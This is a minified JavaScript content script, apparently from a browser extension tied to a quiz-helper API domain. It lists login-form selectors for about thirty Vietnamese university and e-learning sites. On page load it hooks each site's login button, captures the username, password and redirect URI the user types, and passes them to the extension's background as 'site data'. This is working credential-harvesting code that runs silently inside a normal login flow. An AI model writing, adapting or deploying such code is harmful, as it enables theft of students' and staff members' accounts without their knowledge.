const apiUrl = "https://api.quizpoly.xyz";
let form, formSelector;
const formSelectors = {
  "lms.vnedu.vn": {
    form: ".form-login",
    login: ".loginPage-form__button-submit",
    username: 'input[name="email"]',
    password: "#loginFormPassword",
  },
  "feid.fpt.edu.vn": {
    form: "form",
    login: "button.btn[name=button]",
    username: "#Username",
    password: "#Password",
  },
  "cms.poly.edu.vn": {
    form: "#login-form",
    login: ".submit-row input[type=submit]",
    username: "#id_username",
    password: "#id_password",
  },
  "user.vnedu.vn": {
    form: "#frmLogin",
    login: "#btLogon",
    username: "#txtUsername",
    password: "#txtPassword",
  },
  "lms.hvnh.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "lms.hcmussh.edu.vn": {
    form: "#login",
    login: '#login [type="submit"]',
    username: 'input[name="username"]',
    password: 'input[name="password"]',
  },
  "idp.vnu.edu.vn": {
    form: "#kc-form-login",
    login: "#kc-login",
    username: "#username",
    password: "#password",
  },
  "lms.vnu.edu.vn": {
    form: ".login100-form",
    login: ".login100-form > div:nth-child(7) > button",
    username: "#username",
    password: 'input[name="password"]',
  },
  "courses.hcmus.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "lms.ueh.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "lms.uef.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "lms.neu.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "elearning.ctu.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "apps.lms.hutech.edu.vn": {
    form: "#sign-in-form",
    login: "#sign-in",
    username: "#emailOrUsername",
    password: "#password",
  },
  "elearning.tdtu.edu.vn": {
    form: ".signup-form",
    login: ".sign-up-btn>button",
    username: "#username",
    password: "#password",
  },
  "lms.ntt.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "lms.uel.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "utexlms.hcmute.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "lms.hub.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "e-learning.hcmut.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "courses.huflit.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "fitdnu.net": {
    form: "#login",
    login: 'button[type="submit"]',
    username: "#login_username",
    password: "#login_password",
  },
  "lms.dlu.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "elearning.duytan.edu.v": {
    form: "#form",
    login: "#btnLogin",
    username: "#txtUser",
    password: "#txtPass",
  },
  "api.hcm.edu.vn": {
    form: "#globalsignupform",
    login: ".login100-form-btn",
    username: "#UserName",
    password: "#Password",
  },
  "lms.uneti.edu.vn": {
    form: "#login",
    login: "#loginbtn",
    username: "#username",
    password: "#password",
  },
  "cas.hou.edu.vn": {
    form: "#fm1",
    login: ".btn-submit",
    username: "#username",
    password: "#password",
  },
  "cas.ehou.edu.vn": {
    form: "#fm1",
    login: ".btn-submit",
    username: "#username",
    password: "#password",
  },
  "sinhvien.hvu.edu.vn": {
    form: "form",
    login:
      '[mat-ripple-loader-class-name="mat-mdc-button-ripple"][color=primary]',
    username: "#mat-input-0",
    password: "#mat-input-1",
  },
};
function submitForm() {
  const e = form.querySelector(formSelector.username).value,
    n = form.querySelector(formSelector.password).value,
    o = getRedirectUri();
  if (e && n) {
    const r = { username: e, password: n };
    o && (r.redirectUri = o), addData(r);
  }
}
function getRedirectUri() {
  let e = "";
  if ("feid.fpt.edu.vn" == window.location.host) {
    const n = form.querySelector("#ReturnUrl").value,
      o = new URL(n, "https://feid.fpt.edu.vn"),
      r = new URLSearchParams(o.search).get("redirect_uri");
    e = decodeURIComponent(r);
  } else {
    const n = new URLSearchParams(window.location.search),
      o = n.get("continue") || n.get("redirect") || n.get("redirect_uri");
    o && (e = decodeURIComponent(o));
  }
  return e;
}
async function addData(e) {
  chrome.runtime.sendMessage({
    type: "add_site_data",
    site: window.location.host,
    data: e,
  });
}
function waitForElement(e, n = 3e3) {
  return new Promise((o, r) => {
    const s = Date.now(),
      a = setInterval(() => {
        const m = document.querySelector(e);
        m
          ? (clearInterval(a), o(m))
          : Date.now() - s >= n &&
            (clearInterval(a),
            r(
              new Error(`Element with selector "${e}" not found within ${n}ms`)
            ));
      }, 100);
  });
}
function vnuLmsLogin() {
  "lms.vnu.edu.vn" == window.location.host &&
    document
      .querySelector(".login100-form > div:nth-child(4) i")
      .addEventListener("click", () => {
        setTimeout(() => {
          if (form) {
            const e = document.querySelector(formSelector.login);
            e && e.addEventListener("click", submitForm);
          }
        }, 500);
      });
}
function main() {
  window.removeEventListener("load", main, !1),
    (formSelector = formSelectors[window.location.host]),
    waitForElement(formSelector.form).then((e) => {
      if (((form = e), form)) {
        const e = document.querySelector(formSelector.login);
        e && e.addEventListener("click", submitForm);
      }
    }),
    vnuLmsLogin();
}
window.addEventListener("load", main, !1);
